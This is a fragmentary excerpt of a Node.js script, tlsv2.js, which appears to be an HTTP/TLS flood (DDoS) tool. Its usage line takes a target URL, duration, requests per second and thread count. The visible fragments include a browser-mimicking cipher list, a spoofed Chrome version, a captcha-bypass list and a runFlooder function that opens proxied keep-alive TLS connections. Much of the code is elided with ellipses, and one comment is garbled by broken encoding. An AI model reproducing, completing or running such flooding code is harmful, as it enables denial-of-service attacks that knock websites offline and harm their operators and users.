 ...
 const fs = require("fs");
   ...
   if (process.argv.length < 5){console.log(`Usage: node tlsv2.js target time rps thread\nExample: node tlsv2.js https://abcxyz222.shop/ 60 64 3`); process.exit();}
...
const ciphers = "GREASE:" + [
  ...
  const chromeVersion = "116.0.0.0"; // Ð?t phiên b?n Chrome theo mong mu?n c?a b?n
...
const cplist = [ // Captcha Solve by Ibaaall 10-04-2023
 ...
 function runFlooder() {
     ...
     Socker.HTTP(proxyOptions, (connection, error) => {
         ...
         tlsConn.setKeepAlive(true, 60 * 5000);
